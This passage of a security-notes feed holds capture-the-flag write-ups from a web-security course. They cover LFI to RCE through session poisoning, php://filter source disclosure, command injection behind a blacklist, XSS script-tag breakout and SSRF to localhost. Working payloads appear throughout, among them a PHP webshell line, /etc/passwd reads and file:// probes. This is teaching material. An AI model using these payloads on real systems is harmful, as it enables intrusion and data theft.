It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
 Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
&lt;h2 id="exploit---lfi-to-rce">
 Exploit - LFI to RCE
 &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
&lt;li>&lt;code>webshell&lt;/code>
&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
↓
&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
&lt;li>Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
 Simple Web 0x08(Lab - My First Meow Website)
 &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
Target: Login as Admin&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Observe
According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
&lt;li>Use &lt;code>php://filter&lt;/code> to read page
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
:::spoiler page source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
 Home
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
 About
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
 Admin
 &amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/nav&amp;gt;

 &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
 &amp;lt;?php
 if (isset($_GET[&amp;#39;page&amp;#39;]))
 include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
 else
 include(&amp;#34;inc/home.php&amp;#34;);
 ?&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Observe page source code
We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
:::spoiler admin source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
&amp;lt;form&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
if (
 isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
 $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
) {
 echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
}

?&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
 Simple Web 0x09(Lab - DNS Lookup Tool)
 &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8300/">http://h4ck3r.quest:8300/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;) ?&amp;gt;&amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a id=&amp;#34;magic&amp;#34;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;article class=&amp;#34;message is-link is-hidden is-size-4&amp;#34; id=&amp;#34;hint&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;message-body is-family-monospace&amp;#34;&amp;gt;
 host &amp;#39;&amp;lt;span class=&amp;#34;has-text-danger&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
 &amp;lt;/div&amp;gt;
 &amp;lt;/article&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;

 &amp;lt;script&amp;gt;
 magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;#34;is-hidden&amp;#34;);
 window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
 &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
 Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
 &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/7b8uMzpCfug?t=3612">2022/03/30 網頁安全&lt;/a>
&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | WAF&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍 | WAF Edition&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;
 &amp;lt;?php
 $blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#39;flag&amp;#39;];
 $is_input_safe = true;
 foreach ($blacklist as $bad_word)
 if (strstr($_POST[&amp;#39;name&amp;#39;], $bad_word) !== false) $is_input_safe = false;

 if ($is_input_safe)
 system(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;);
 else
 echo &amp;#34;HACKER!!!&amp;#34;;
 ?&amp;gt;
 &amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::
It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
 Simple Web 0x11(Lab - XSS Me)
 &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Check XSS
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
&lt;li>Try to inject script tag
Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Hint
If you login as guest(password = guest), then you can get the response
&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>
&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
